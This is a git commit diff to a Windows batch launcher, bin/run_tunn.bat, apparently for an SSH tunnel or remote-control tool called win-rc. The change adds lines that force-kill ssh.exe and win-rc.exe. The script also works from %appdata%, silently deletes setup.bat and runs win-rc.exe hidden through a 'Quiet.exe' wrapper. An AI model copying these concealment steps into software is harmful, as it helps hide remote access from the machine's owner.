31d36a73d260dc9e6f1eee71069d3f3d54d05c20
Eric106 <ercv106@hotmail.com>
2022-09-24 18:10:53 -0500

    sÃ¡b, 24 de sep de 2022 18:10:53

--- bin/run_tunn.bat
+++ bin/run_tunn.bat
@@ -1,4 +1,6 @@
 @echo off
+taskkill /IM "ssh.exe" /F >nul 2>&1
+taskkill /IM "win-rc.exe" /F >nul 2>&1
 cd %appdata%\win-rc\ >nul 2>&1
 del setup.bat >nul 2>&1
 bin\Quiet\Quiet.exe win-rc.exe >nul 2>&1
